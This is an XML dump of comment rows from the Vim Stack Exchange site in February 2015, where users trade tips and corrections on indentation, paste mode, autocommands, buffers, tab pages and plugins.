  <row Id="190" PostId="237" Score="0" Text="If you'd like more control (or reduce the repeated hassle) consider adding an auto-command to invoke a code-formatting tool like `astyle` when you save a buffer. See [this](http://stackoverflow.com/questions/12209971/in-vim-i-want-to-run-astyle-on-the-file-im-on-when-i-save) question on SO for the details." CreationDate="2015-02-04T04:11:01.147" UserId="224" />
  <row Id="191" PostId="241" Score="1" Text="I found [this](http://stackoverflow.com/a/4818223/761170) answer over at SO relevant, but I'd like to have this functionality without a plugin if possible." CreationDate="2015-02-04T04:15:27.193" UserId="224" />
  <row Id="192" PostId="238" Score="0" Text="This happens in standard `gnome-terminal` too, without `tmux`." CreationDate="2015-02-04T05:25:51.327" UserId="142" />
  <row Id="193" PostId="235" Score="0" Text="`'smartindent'` is deprecated, so that's not the best choice. It has been replaced by `'cindent'` and `'cinoptions'` for C-like languages.  In general, though, file type indenting is the way to go, with `'autoindent'` as a fallback." CreationDate="2015-02-04T05:25:56.180" UserId="15" />
  <row Id="194" PostId="247" Score="1" Text="Setting the t_ut option worked!" CreationDate="2015-02-04T06:04:34.760" UserId="226" />
  <row Id="195" PostId="41" Score="4" Text="note a vimrc file can also be called other things: for example vimrc (if it's in ~/.vim)." CreationDate="2015-02-04T06:09:45.483" UserId="233" />
  <row Id="196" PostId="219" Score="0" Text="This is one of the plugins I swear by.. it's like having a little scratch buffer that you can commit back to your normal code file." CreationDate="2015-02-04T06:57:38.020" UserId="248" />
  <row Id="197" PostId="242" Score="5" Text="You can nicely select the code you pasted in visual mode using \`[v\`]" CreationDate="2015-02-04T07:04:01.140" UserId="248" />
  <row Id="198" PostId="235" Score="0" Text="@jamessan `smartindent` isn't deprecated, but `cindent` is worth noting. I've updated the answer. (Thanks!)" CreationDate="2015-02-04T07:15:42.053" UserId="24" />
  <row Id="199" PostId="221" Score="0" Text="As an aside, I find this plugin very useful for editing markdown https://github.com/suan/vim-instant-markdown" CreationDate="2015-02-04T07:24:17.500" UserId="248" />
  <row Id="200" PostId="255" Score="1" Text="thanks for the suggestion, but as I did note in my question, I'd like to know if this can be done without a plugin." CreationDate="2015-02-04T07:28:39.943" UserId="224" />
  <row Id="201" PostId="190" Score="0" Text="I've tried them all and I always come back to SuperTab, it's the least intrusive." CreationDate="2015-02-04T07:31:00.583" UserId="248" />
  <row Id="202" PostId="150" Score="0" Text="Having any kind of folding enabled also has a massive effect" CreationDate="2015-02-04T07:38:57.280" UserId="248" />
  <row Id="203" PostId="257" Score="0" Text="This saves you a single keystroke when you don't need to navigate your file (i.e. in empty files) since navigation is easier in command mode. Why would you want to do this?" CreationDate="2015-02-04T07:41:19.070" UserId="211" />
  <row Id="204" PostId="257" Score="1" Text="@Earthliŋ - Because I can only access my Linux over SSH, and my computer that I can use for SSH access is _*so*_ slow, it takes _*ages*_ to load command mode. (Also my Openwrt system is quite slow)." CreationDate="2015-02-04T07:45:25.977" UserId="254" />
  <row Id="205" PostId="257" Score="3" Text="Thanks. Why don't you add this info to the question body? This way the question makes much more sense (to me at least) and will be easier findable (e.g. by searching &quot;vim command mode slow to load&quot;)." CreationDate="2015-02-04T07:59:09.577" UserId="211" />
  <row Id="206" PostId="241" Score="5" Text="Please include requirements like that in the question itself, instead of in a comment." CreationDate="2015-02-04T08:00:57.743" UserId="205" />
  <row Id="207" PostId="182" Score="0" Text="You might be also interested in this plugin:&#xA;https://github.com/tomtom/enabler_vim/" CreationDate="2015-02-04T08:01:06.693" UserId="258" />
  <row Id="208" PostId="13" Score="1" Text="I use this kind of script on my Nokia N900: http://www.vim.org/scripts/script.php?script_id=3141" CreationDate="2015-02-04T08:03:40.020" UserId="258" />
  <row Id="209" PostId="254" Score="3" Text="This is redundant, since you could just do 500l to move 500 characters right." CreationDate="2015-02-04T08:10:02.760" UserId="263" />
  <row Id="210" PostId="258" Score="0" Text="This is hackish, but perhaps you could use `BufNewFile` to trigger the creation of an autocommand with a `BufWritePost`. After the event for `BufWritePost` finishes, delete the `BufWritePost` autocommand." CreationDate="2015-02-04T08:11:06.320" UserId="261" />
  <row Id="211" PostId="254" Score="0" Text="True. Than maybe something like ``qd500lq`` to use just ``@d`` to move 500 characters right?" CreationDate="2015-02-04T08:11:31.373" UserId="245" />
  <row Id="212" PostId="258" Score="0" Text="@void-pointer I considered doing that, then I stopped to wonder if there's a more elegant way - perhaps I had misunderstood the meaning of some event or something like that." CreationDate="2015-02-04T08:14:12.830" UserId="205" />
  <row Id="214" PostId="269" Score="0" Text="Is there a reason why you would have hard linebreaks as opposed to being on one long line (or more reasonable, one line per paragraph, as one might do in a TeX document)." CreationDate="2015-02-04T08:21:41.390" UserId="130" />
  <row Id="215" PostId="258" Score="0" Text="I'm not an expert on Vimscript, but after going through `help au`, it doesn't seem like there's a mechanism in place to fire an autocommand on the first write only." CreationDate="2015-02-04T08:23:57.480" UserId="261" />
  <row Id="216" PostId="269" Score="0" Text="@mixedmath I like to set my textwidth to 80 and use gqap after I finish writing a paragraph. I would imagine that the document would become difficult to read if I used the one sentence per paragraph approach." CreationDate="2015-02-04T08:25:11.567" UserId="261" />
  <row Id="220" PostId="235" Score="0" Text="I'd also recommend you taking a look at http://editorconfig.org/  . There's of course a plugin for vim (and many other editors) and it's a great way to keep your editor defaults on your VCS" CreationDate="2015-02-04T08:50:18.560" UserId="266" />
  <row Id="221" PostId="265" Score="1" Text="Although you've probably heard this before, vim-latex is an extremely large and convoluted plugin that's deceptively challenging to modify in reasonable ways. So the easy answer is &quot;ignore it&quot;. The longer answer is: make changes to ftplugin/outline.py,envmacros.vim,wizardfuncs.vim,texrc,dictionaries/dictionary. If you search and remove every instance of eqnarray, latex-suite will continue to work and will omit eqnarray. Adding your own wouldn't be too dissimilar to replacing each instance of eqnarray with align (or your desired environment)." CreationDate="2015-02-04T08:58:46.517" UserId="130" />
  <row Id="222" PostId="268" Score="0" Text="Take a look at ‘:h write-help`" CreationDate="2015-02-04T08:59:22.807" UserId="266" />
  <row Id="223" PostId="276" Score="0" Text="Have you installed any plugins?" CreationDate="2015-02-04T09:00:00.047" UserId="245" />
  <row Id="224" PostId="268" Score="0" Text="Sorry :h help-writing" CreationDate="2015-02-04T09:00:03.020" UserId="266" />
  <row Id="225" PostId="276" Score="0" Text="Something akin to `bash -x` to see what gets executed would be useful." CreationDate="2015-02-04T09:00:34.737" UserId="205" />
  <row Id="226" PostId="228" Score="1" Text="Isn't this answer directly disproven by [doorknob's post](http://vi.stackexchange.com/a/195/267)?" CreationDate="2015-02-04T09:00:53.897" UserId="267" />
  <row Id="227" PostId="276" Score="0" Text="@Melon: Yes I only have 1 plugin installed.&#xA;muru: Can you explain further?" CreationDate="2015-02-04T09:04:51.083" UserId="65" />
  <row Id="228" PostId="276" Score="0" Text="Oh, I don't have an answer. I was just noting that something similar to `bash -x` would be handy. `bash -x` prints out every command executed, so if you have slow loading times, you could see which commands slow it down." CreationDate="2015-02-04T09:10:05.137" UserId="205" />
  <row Id="229" PostId="268" Score="0" Text="@LeonardoConstantino Unless I'm mistaken, this would be akin to literally integrating my todo list into vim's help system. I'm not interested in typing `:h hardway` and being taken to my entry on `hardway` which is actually a helpfile. Or perhaps I'm misunderstanding your suggestion? Forgive me, I'm not entirely certain." CreationDate="2015-02-04T09:10:10.470" UserId="130" />
  <row Id="231" PostId="277" Score="0" Text="I followed your instructions. After starting profiling, I used `dw` twice and then exit. Then looking at the log I got `FUNCTION LatexBox_FoldLevel(), Called 1930 times`" CreationDate="2015-02-04T09:16:06.657" UserId="65" />
  <row Id="232" PostId="265" Score="0" Text="@mixedmath In fact I haven't heard anything about vim-latex. Are you saying it's better to &quot;write my own plugin&quot;? So far vim-latex has syntax highlighting, predefined environments, auto-completion and key bindings for compilation. How much work would it be to replicate these features from scratch? (I don't mind typing, so I could live without auto-completion.)" CreationDate="2015-02-04T09:16:55.417" UserId="211" />
  <row Id="233" PostId="276" Score="1" Text="Dangit, I answered a duplicate. While I vote to close this as a duplicate, I also respond to your comment: LatexBox shouldn't be called 2000 times after deleting 2 words. Now that you've  found the problem, you have to finagle with the plugin. I wish I knew more about LatexBox to help you." CreationDate="2015-02-04T09:20:05.760" UserId="130" />
  <row Id="234" PostId="51" Score="4" Text="This reads like a rehash of a press release rather than an actual rundown of why somebody should care. For example I've been using vim for two decades and can't remember the last time the core program showed me any kind of instability so why should I care about &quot;more stable&quot;?" CreationDate="2015-02-04T09:23:25.310" UserId="267" />
  <row Id="235" PostId="276" Score="0" Text="@Carpetsmoker Yes, [this answer](http://vi.stackexchange.com/a/191/205) is very close to what I had in mind for this question." CreationDate="2015-02-04T09:23:43.727" UserId="205" />
  <row Id="236" PostId="265" Score="0" Text="Are you asking about how to neuter the Vim-LaTeX plugin so that it no longer supports `eqnarray`? Or are you asking about how to expunge `eqnarray` from all your existing documents the next time you open them? Or something else?" CreationDate="2015-02-04T09:33:36.433" UserId="24" />
  <row Id="237" PostId="284" Score="1" Text="Trying this, I get `E121: Undefined variable: mapleader`." CreationDate="2015-02-04T09:37:15.120" UserId="268" />
  <row Id="238" PostId="284" Score="0" Text="Then for some reason the mapleader was not set or has been unset" CreationDate="2015-02-04T09:38:49.390" UserId="248" />
  <row Id="239" PostId="265" Score="0" Text="No, I wouldn't recommend writing your own plugin. I'm not quite sure what you're quoting from there, either. There are a variety of latex plugins. latex-suite is known to integrate poorly with other plugins and is a pain to modify. It redefines a bunch of syntax regions that override the regions used by other plugins. It also has more functionality than anyone uses, and cannot be toggled off. For what it's worth, the README on [lervag/vim-latex](https://github.com/lervag/vim-latex) (which is not latex-suite/the vim-latex you're mentioning) links to the 4 most common latex plugins." CreationDate="2015-02-04T09:40:15.813" UserId="130" />
  <row Id="240" PostId="265" Score="0" Text="@200_success The former (I've updated the question)." CreationDate="2015-02-04T09:42:24.663" UserId="211" />
  <row Id="241" PostId="265" Score="0" Text="Either a global search-and-replace in the plugin's source code takes care of it, or the question is too broad. Either way, I don't see this as a good question for the site." CreationDate="2015-02-04T09:45:08.267" UserId="24" />
  <row Id="242" PostId="284" Score="1" Text="Oh, got it. Just a note for others then, if you don't *explicitly* set the leader key then you get the error above." CreationDate="2015-02-04T09:45:34.307" UserId="268" />
  <row Id="243" PostId="280" Score="0" Text="I suppose for my case it would be: `[ -f &quot;$f&quot; ] || {touch &quot;$f&quot; &amp;&amp; chmod +x &quot;$f&quot;}` *before* `vim`. But yes, combined with `vim -p` this would be very useful for me." CreationDate="2015-02-04T09:52:37.640" UserId="205" />
  <row Id="244" PostId="282" Score="0" Text="Why do we need a backslash in `&quot;\&lt;Space&gt;&quot;`?" CreationDate="2015-02-04T09:52:39.177" UserId="53" />
  <row Id="245" PostId="280" Score="0" Text="@muru Normally, when you do `vim newfile`, it doesn't make the file *until* you write it for the first time. So this works better the same as the default vim behaviour... And because you run this command explicitly (and not on every `:w`), running the `chmod` on existing files *as well* can be considered a feature, and not a bug :-)" CreationDate="2015-02-04T09:54:59.500" UserId="51" />
  <row Id="246" PostId="280" Score="0" Text="This does suffer from the same flaw is Dhruva's original answer - I don't want the action run on an existing file or repeatedly over the same file. In my case, solidly a bug." CreationDate="2015-02-04T09:56:44.083" UserId="205" />
  <row Id="248" PostId="280" Score="0" Text="@muru But you *only* run this when you create the file (once). Then when you edit it the next time, you just use `vim` and none of this gets run (that's how I use it, anyway)." CreationDate="2015-02-04T10:02:26.100" UserId="51" />
  <row Id="249" PostId="51" Score="1" Text="Like I said in the last paragraph, it's not about stability but more about the kind of community it's built around. Nobody dare question vim's stability, I surely would not, have been using it for 8 long years and since last 2 years have been using the head version!" CreationDate="2015-02-04T10:03:03.160" UserId="74" />
  <row Id="250" PostId="280" Score="0" Text="Remembering that sort of stuff (use x for this and y for that) is what I have vim and zsh for. :P" CreationDate="2015-02-04T10:03:58.453" UserId="205" />
  <row Id="251" PostId="280" Score="0" Text="@muru Well, the point is your script never know which files you want executable anyway. Not all .py files are supposed to be executable... So a &quot;human decision&quot; is needed at some point." CreationDate="2015-02-04T10:05:38.530" UserId="51" />
  <row Id="253" PostId="286" Score="0" Text="`gvim` and `vim` are the same program. Just the UI is different." CreationDate="2015-02-04T10:16:01.577" UserId="51" />
  <row Id="254" PostId="286" Score="0" Text="@Carpetsmoker Yes you are right, I'll update the question." CreationDate="2015-02-04T10:20:11.443" UserId="147" />
  <row Id="257" PostId="265" Score="3" Text="@200_success I don't see how it is bad, it satisfies all requirements IMHO: It's on-topic (vim plugin), well stated now (make latex-suite forget what `eqnarray` is), applicable to general situation (if someone else wants the same thing, they should be able to use the solution to this specific one)." CreationDate="2015-02-04T10:43:22.493" UserId="82" />
  <row Id="258" PostId="41" Score="0" Text="@SaiManojKumarYadlapati Yes, AS said this has to be the same vom session. Bufwritepost is triggered when vom does the write" CreationDate="2015-02-04T11:01:10.673" UserId="59" />
  <row Id="260" PostId="292" Score="0" Text="Can it manage multiple session files?" CreationDate="2015-02-04T11:32:13.777" UserId="162" />
  <row Id="261" PostId="292" Score="1" Text="@Nebril It can. When you save the session, use the format `:Obsess &lt;session-name&gt;`. Use the particular session name you want when reloading." CreationDate="2015-02-04T11:35:05.570" UserId="53" />
  <row Id="262" PostId="291" Score="0" Text="I think this is accurate as far as it goes bot it needs to go farther to be really useful. There are at least two things that need to noted: self contained and self extracting (vimroll?) plugins and plugin managers that handle plugin dependencies and require a meta data format." CreationDate="2015-02-04T11:37:55.933" UserId="267" />
  <row Id="264" PostId="292" Score="0" Text="Thanks, I will give it a try then." CreationDate="2015-02-04T12:59:25.733" UserId="162" />
  <row Id="265" PostId="176" Score="0" Text="@Kit, the XY problem is when you failed at doing Y in order to achieve X but ask about Y instead of asking about X. Please, see my edit." CreationDate="2015-02-04T13:19:12.510" UserId="54" />
  <row Id="266" PostId="242" Score="0" Text="@Badger Just to clarify, is that backtick-bracket-v-backtick-bracket?" CreationDate="2015-02-04T13:31:18.183" UserId="286" />
  <row Id="267" PostId="299" Score="1" Text="Hmm, this does disable syntax highlighting, but in _all_ buffers, not just the one with the big file. Furthermore `&amp;ft` seems not to be set in this context thus I don't know how to restrict it to xml files only. Any ideas?" CreationDate="2015-02-04T13:54:05.970" UserId="117" />
  <row Id="268" PostId="300" Score="1" Text="You can map any key combination anywhere, and you can't do quite anything else. Is that what you mean?" CreationDate="2015-02-04T13:56:22.307" UserId="82" />
  <row Id="269" PostId="301" Score="0" Text="I use this, it's not often that I need to type two j's together, when I do I just need to give it a second or so between clicks." CreationDate="2015-02-04T13:58:49.263" UserId="11" />
  <row Id="270" PostId="301" Score="1" Text="In dvorak, `j` is the `c` key. So this wouldn't be too bad (to type `cc`). I could also bind `hh` (qwerty `j` key = dvorak `h`), which would only boot me if i was typing `shhhhhhh` or something." CreationDate="2015-02-04T13:59:13.087" UserId="134" />
  <row Id="271" PostId="294" Score="0" Text="As usual: `:help :o`." CreationDate="2015-02-04T14:19:40.907" UserId="54" />
  <row Id="273" PostId="303" Score="0" Text="Again, these are not improvements, as Ctrl is just as far from the home row as Escape is." CreationDate="2015-02-04T14:25:49.367" UserId="134" />
  <row Id="274" PostId="282" Score="6" Text="The backslash is required because otherwise vim will recognize &quot;&lt;Space&gt;&quot; as a normal string and not the code for the space key. See `:help expr-string` for examples." CreationDate="2015-02-04T14:38:40.917" UserId="20" />
  <row Id="275" PostId="242" Score="0" Text="yup.. the textarea freaked out about the backticks, so I couldn't put it in a code block :P" CreationDate="2015-02-04T14:41:03.107" UserId="248" />
  <row Id="276" PostId="68" Score="0" Text="could you combine the previous error '[s' in a remap? I would add as an answer but don't know how to do the remap so I'll leave that for someone else." CreationDate="2015-02-04T14:42:07.957" UserId="11" />
  <row Id="277" PostId="301" Score="5" Text="cc is a much more common two letter key combination, in English at least. So that may not be the best choice" CreationDate="2015-02-04T14:44:50.500" UserId="11" />
  <row Id="278" PostId="305" Score="0" Text="Related: http://stackoverflow.com/questions/1205286/renaming-the-current-file-in-vim" CreationDate="2015-02-04T14:45:06.930" UserId="205" />
  <row Id="281" PostId="309" Score="26" Text="But I'm writing a book about playing Edsgar Dijkstra playing blackjack in Reykjavik! ;)" CreationDate="2015-02-04T15:05:06.893" UserId="134" />
  <row Id="282" PostId="308" Score="0" Text="See also: http://stackoverflow.com/q/15191291 (no answers for your question though, unfortunately)" CreationDate="2015-02-04T15:06:10.630" UserId="88" />
  <row Id="283" PostId="149" Score="0" Text="Most likely I will get banned from the site forever but I have to say it: when it comes to work with huge files Emacs is the tool for the job. :-)" CreationDate="2015-02-04T15:09:48.963" UserId="13" />
  <row Id="284" PostId="303" Score="4" Text="@durron597 On a QWERTY keyboard, Ctrl may be just as far from home row, but it does have an important difference: it's *below* the home row. You only have to move your finger to press it, whereas with Esc you have to rotate your whole hand somewhat. Also, the `&lt;C-[&gt;` has a nice symmetry to it (both little fingers moving in opposite directions)." CreationDate="2015-02-04T15:10:52.970" UserId="142" />
  <row Id="286" PostId="303" Score="4" Text="Note that `&lt;C-c&gt;` [is not exactly the same as `&lt;Esc&gt;`](http://stackoverflow.com/a/5036294/732016)." CreationDate="2015-02-04T15:11:42.957" UserId="142" />
  <row Id="288" PostId="310" Score="0" Text="[What do we do with questions that are already answered somewhere else on SE](http://meta.vi.stackexchange.com/questions/45/what-do-we-do-with-questions-that-are-already-answered-somewhere-else-on-se)" CreationDate="2015-02-04T15:15:31.107" UserId="153" />
  <row Id="289" PostId="310" Score="0" Text="@OrangeTux I posted in the spirit of Gilles' answer. But with the downvote I wonder what would Gilles say to a post linking to an existing post?" CreationDate="2015-02-04T15:20:46.707" UserId="205" />
  <row Id="290" PostId="116" Score="0" Text="This isn't strictly a &quot;mode&quot; in the Vim sense of the term, so I've edited out the [modes] tag." CreationDate="2015-02-04T15:21:57.883" UserId="88" />
  <row Id="291" PostId="299" Score="0" Text="I think you want `set syntax=OFF` instead. (Or should that be setlocal?)" CreationDate="2015-02-04T15:22:02.983" UserId="31" />
  <row Id="292" PostId="116" Score="0" Text="@200_success `:help recording` isn't obvious, but `:help q` is and leads to the same place." CreationDate="2015-02-04T15:23:27.033" UserId="8" />
  <row Id="293" PostId="310" Score="0" Text="@Carpetsmoker I didn't see your comment update. An empty tabpage is not a big problem when your sessions tend to end with `:qa` by force of habit. If that's the only advantage I'd go with the other one, since it does seem simpler." CreationDate="2015-02-04T15:24:05.737" UserId="205" />
  <row Id="294" PostId="299" Score="0" Text="you might want to try `syntax clear` then maybe ?" CreationDate="2015-02-04T15:24:33.400" UserId="74" />
  <row Id="295" PostId="310" Score="3" Text="@muru WWGS? Do you have a reason to think the answers on [so] aren't satisfactory? If so, explain that in your question. In any case, summarize the SO answers in your question. If that leads to the question containing its own answer, don't post." CreationDate="2015-02-04T15:29:04.097" UserId="8" />
  <row Id="296" PostId="310" Score="0" Text="@Gilles Updated. I didn't post the actual commands, do you think I should?" CreationDate="2015-02-04T15:34:26.897" UserId="205" />
  <row Id="297" PostId="308" Score="1" Text="@Doorknob, no answers, but it does raise a good point: Regex doesn't start searching from the middle of a string. I might have to involve some VimScript to get the job done. I'm exploring the idea of reversing the (long) match, and searching it for the reversed pattern." CreationDate="2015-02-04T15:38:05.743" UserId="64" />
  <row Id="298" PostId="153" Score="1" Text="And you could map `:set syntax=prolog` to something (maybe `&lt;Leader&gt;-p`)." CreationDate="2015-02-04T15:38:19.340" UserId="141" />
  <row Id="299" PostId="310" Score="0" Text="@muru Since none of the commands meet all of your requirements, it isn't necessary to post them. It might be useful, however, to stave off answers that say “just do X” only for you to have to reply “no, that doesn't meet requirement #3”." CreationDate="2015-02-04T15:44:20.607" UserId="8" />
  <row Id="300" PostId="82" Score="0" Text="@Byron Arch linux with tiling WMs. I have latest gcc and clang installed and completed install with same steps you told." CreationDate="2015-02-04T15:44:53.947" UserId="101" />
  <row Id="302" PostId="321" Score="0" Text="Another really useful tool to use with this is the `sort` command." CreationDate="2015-02-04T16:24:31.473" UserId="306" />
  <row Id="303" PostId="321" Score="4" Text="@CodyPoll What's wrong with Vim's `:sort`?" CreationDate="2015-02-04T16:25:29.470" UserId="51" />
  <row Id="305" PostId="321" Score="2" Text="Well I'll be - never knew about that command." CreationDate="2015-02-04T16:27:32.807" UserId="306" />
  <row Id="307" PostId="321" Score="5" Text="@Carpetsmoker The external sort command has a lot more options and (depending on locale, etc.) produces a different order." CreationDate="2015-02-04T16:34:21.707" UserId="31" />
  <row Id="309" PostId="324" Score="0" Text="I've edited your question, as you can refer to different concepts when you say &quot;buffer&quot;, depending on context... Your original question was somewhat unclear IMHO ... I hope you agree with this, but feel free to change it back if you don't." CreationDate="2015-02-04T16:48:36.363" UserId="51" />
  <row Id="310" PostId="324" Score="0" Text="The term &quot;paste buffer&quot; is often used (not just within the context of vim) to mean the clipboard or something similar. It's not necessarily the same use of &quot;buffer&quot; in the vim sense." CreationDate="2015-02-04T16:48:51.293" UserId="72" />
  <row Id="312" PostId="324" Score="0" Text="@Carpetsmoker thanks for the edit. Perhaps the multiple uses (and perhaps misuses) of the term buffer leads to my confusion." CreationDate="2015-02-04T16:55:19.057" UserId="69" />
  <row Id="313" PostId="324" Score="0" Text="@Carpetsmoker Actually, the term buffer is quite clearly defined in Vim.  That people are misusing the term doesn't mean that there are actually multiple ways that it can be understood with respect to Vim." CreationDate="2015-02-04T16:56:15.090" UserId="15" />
  <row Id="315" PostId="261" Score="0" Text="Does this only work with Vim, or does it work also on Vi (My Openwrt system only has Vi)." CreationDate="2015-02-04T16:58:25.860" UserId="254" />
  <row Id="316" PostId="310" Score="0" Text="Why do you need to use a tab page for every buffer?  There are many ways to navigate through the open buffers in a single tab page.  Vim's tab pages are intended to be used more like viewports than as a representation of a file.  The latter is already implemented by Vim's buffers." CreationDate="2015-02-04T17:02:48.887" UserId="15" />
  <row Id="317" PostId="307" Score="0" Text="Thanks for the edit/fix :) @carpetsmoker" CreationDate="2015-02-04T17:06:45.127" UserId="248" />
  <row Id="318" PostId="310" Score="0" Text="@jamessan Why not? What do I gain from using buffers instead? With tabs, I can see a quick visual indication of which file I'm editing. I'm pretty sure that can be done with buffers. I have read [this famous post](http://stackoverflow.com/questions/102384/using-vims-tabs-like-buffers/103590#103590), but if I were to make an analogy: I don't see why I should use Firefox's tab groups instead of having windows open in different workspaces. I have never really gotten used to navigating buffers, but if the reasoning is strong enough, I don't mind switching." CreationDate="2015-02-04T17:14:05.140" UserId="205" />
  <row Id="321" PostId="310" Score="0" Text="Everything in Vim is built around buffers.  Windows exist to view buffers.  Tab pages exist to organize windows.  Buffers can be displayed in any number of windows (and therefore tab pages).  Ignoring the fact that the buffer is the core object is just limiting your potential experience with Vim.  Using tab pages just for the visual cue of the buffer doesn't scale, because eventually the tab page title becomes too small.  Maybe I should make an answer to go further." CreationDate="2015-02-04T17:27:29.023" UserId="15" />
  <row Id="322" PostId="331" Score="2" Text="None of this answers my question. I put in explicit requirements for a reason! Usually `'paste'` is indeed not active beforehand, but I don't want to have to think about this. I often work in a Vim that doesn't have access to the X clipboard or mouse, either because my Vim build doesn't have the `xterm_clipboard` feature, or because I'm working in e.g. a Screen session which happens to be currently attached to an X terminal." CreationDate="2015-02-04T17:30:10.250" UserId="8" />
  <row Id="323" PostId="141" Score="0" Text="It does not work for me. It inserts a comment only in the first line." CreationDate="2015-02-04T17:38:30.100" UserId="83" />
  <row Id="324" PostId="141" Score="0" Text="Are you pushing `ctrl`? Because `ctrl+v` is a different thing from just `v`." CreationDate="2015-02-04T17:40:44.677" UserId="306" />
  <row Id="325" PostId="213" Score="0" Text="Wow, that's an amazing use of search, thanks @superjer! And my mind is blown for the day by learning about vim's advanced registers." CreationDate="2015-02-04T17:46:35.337" UserId="67" />
  <row Id="326" PostId="213" Score="0" Text="One disadvantage of this approach is that if you have search highlighting on, you'll find that all the characters in the cursor's vertical column are now highlighted after &quot;column up&quot;ing or &quot;column down&quot;ing." CreationDate="2015-02-04T17:47:57.543" UserId="67" />
  <row Id="328" PostId="156" Score="1" Text="This seems to work perfectly (and quickly), and is easily modified into a `FloatDown` function as well. Into my .vimrc it goes, thanks! https://github.com/alxndr/dotfiles/commit/0e25a302" CreationDate="2015-02-04T17:54:43.520" UserId="67" />
  <row Id="329" PostId="331" Score="0" Text="@Gilles Then could you explain how you're pasting?  That's relevant information to be able to provide an answer that can wrap that action with what you want to do." CreationDate="2015-02-04T17:55:52.117" UserId="15" />
  <row Id="336" PostId="161" Score="1" Text="Option 4: Plugin" CreationDate="2015-02-04T18:25:31.070" UserId="306" />
  <row Id="340" PostId="335" Score="0" Text="This seems to be on the right track, but it isn't working. A plain `p` (without a preceding `&quot;` and register name) doesn't do anything other than make `&quot;p` appears in the status line. `&quot;ap` is equivalent to `a`, `&quot;bp` beeps, … I don't get the logic. `&quot;+` beeps immediately, I don't even get to say that I mean `+` or `*` as a register name." CreationDate="2015-02-04T18:33:22.507" UserId="8" />
  <row Id="341" PostId="335" Score="0" Text="Assuming these fundamental problems are solved, is there an exhaustive list of commands I'd need to override? The set looks daunting, especially if I want to support yanking as well." CreationDate="2015-02-04T18:34:17.103" UserId="8" />
  <row Id="342" PostId="331" Score="1" Text="My basic use case is to paste with the middle mouse button or with Shift+Insert. That's not really relevant though: the core of the question is how to set an option, switch to insert mode (with `i`, I'm not asking how to parametrize this), and restore the value of the option upon return from insert mode." CreationDate="2015-02-04T18:35:40.233" UserId="8" />
  <row Id="343" PostId="335" Score="0" Text="@Gilles Updated to fix the behavior with non-+/* registers.  The problem with `&quot;+` when your vim has `-xterm_clipboard` is more difficult because it never gets to this function.  Specifying an invalid register (`+`) aborts the command.  SO, it looks like the behavior actually has to be inverted so map the `&quot;+` or `&quot;*` and then handle the command specified by the user..." CreationDate="2015-02-04T18:49:24.360" UserId="15" />
  <row Id="344" PostId="340" Score="0" Text="Sidenote: if you're pressing the same movement key more than a few times in a row, you're probably doing it wrong (use `wWeE$)}` etc.), and if you're using arrow keys you're *definitely* using Vim wrong." CreationDate="2015-02-04T18:53:18.103" UserId="88" />
  <row Id="345" PostId="338" Score="5" Text="@Carpetsmoker There isn't really room for other answers because this is any answer is just going to be a partial list of the easter eggs.  Either there should be one `Community Wiki` answer or the question should be closed for the same reason http://vi.stackexchange.com/q/186/15 was closed." CreationDate="2015-02-04T18:53:46.477" UserId="15" />
  <row Id="346" PostId="345" Score="0" Text="That was freakishly fast!" CreationDate="2015-02-04T18:59:00.940" UserId="135" />
  <row Id="347" PostId="345" Score="5" Text="@janos :-) I cheated. I wrote this last week, because I thought it would make a&#xA;good weblog post ... I haven't completely finished it yet, but it's finished enough to be a good fit for this question." CreationDate="2015-02-04T19:04:03.030" UserId="51" />
  <row Id="350" PostId="331" Score="1" Text="@Gilles The core of your question as stated in this comment is much clearer to me than your original question.  Thanks." CreationDate="2015-02-04T19:48:12.927" UserId="15" />
  <row Id="351" PostId="328" Score="1" Text="I like your question (I've been there many times myself). However, isn't it easier to paste from the `+` or `*` register?" CreationDate="2015-02-04T19:49:17.070" UserId="82" />
  <row Id="352" PostId="331" Score="1" Text="@Gilles It is not relevant to _you_, but it can be relevant to future visitors. Therefore either you can put it in the question itself (&quot;I know I can use `&quot;*p` or `&quot;+p` to paste from the clipboards, but I wan't to use the system's paste abilities&quot;) and then this answer is unnecessary. Or you don't, and then I think this answer has its place here." CreationDate="2015-02-04T19:51:45.347" UserId="82" />
  <row Id="353" PostId="349" Score="1" Text="Fully agree. Having the ctrl key on the home row improves a lot of usability (scrolling through completions with ctrl+n, scrolling through the file with ctrl+f/ctrl+b, escaping with ctrl+] etc. All of these key combos are easier to perform this way." CreationDate="2015-02-04T20:09:59.057" UserId="227" />
  <row Id="354" PostId="351" Score="0" Text="Wow. For me it's even worse. If I do `gg=G` in a `.js` file like this (`ft=javascript` properly), the indent on `.chainCall2()` *only* is removed." CreationDate="2015-02-04T20:12:21.150" UserId="135" />
  <row Id="355" PostId="350" Score="0" Text="I believe the OP is using OSX, so neither Win32 nor X11 (most likely)." CreationDate="2015-02-04T20:18:05.117" UserId="5" />
  <row Id="356" PostId="350" Score="1" Text="Is there an answer for OSX?" CreationDate="2015-02-04T20:19:17.520" UserId="141" />
  <row Id="357" PostId="350" Score="0" Text="Alas, the vim documentation doesn't mention OSX and I don't have an OSX machine handy on which to try it. :-(" CreationDate="2015-02-04T20:22:20.240" UserId="227" />
  <row Id="358" PostId="212" Score="0" Text="Thanks, that's the one I was after" CreationDate="2015-02-04T20:32:26.247" UserId="182" />
  <row Id="359" PostId="331" Score="0" Text="@yo' Ok, I've edited my question. Pasting from the clipboard was just a motivating example — the core of the question is how to save and restore an option around an insertion command." CreationDate="2015-02-04T21:01:21.397" UserId="8" />
  <row Id="360" PostId="328" Score="0" Text="@yo' [Only when they work](http://vi.stackexchange.com/questions/332/define-custom-commands-for-the-and-registers). Which, for my uses of Vim, is often not the case." CreationDate="2015-02-04T21:02:04.100" UserId="8" />
  <row Id="361" PostId="347" Score="1" Text="If I use multiple windows, does that mean they have to be on-screen all the time? What happens if I close a window while another window shows the same buffer, is the cursor position in that window lost? Is there anything like `:ownsyntax` for other settings, such as indentation, compiler command, etc.?" CreationDate="2015-02-04T21:12:43.510" UserId="8" />
  <row Id="362" PostId="348" Score="0" Text="This seems on the right track (in particular, I had no idea how to “bracket” a stretch of insertion by normal world commands). Thanks. However, it isn't quite right and I don't see where the problem is: after `_i`, the `paste` option is off, even if it was on before." CreationDate="2015-02-04T21:16:10.750" UserId="8" />
  <row Id="363" PostId="344" Score="0" Text="If I follow these instructions (open binary file, `:%!xxd`, `:%!xxd -r`, `:w`, didnt make any changes!) then the binary file written is **not** the same as the original ... Is this the case for you (I tested with `/bin/ls`). I need to use `:set binary` before saving (also see my answer which explains why) ... Maybe it's something in my vimrc? But regardless, I would always use `set binary` for safety ..." CreationDate="2015-02-04T21:31:29.120" UserId="51" />
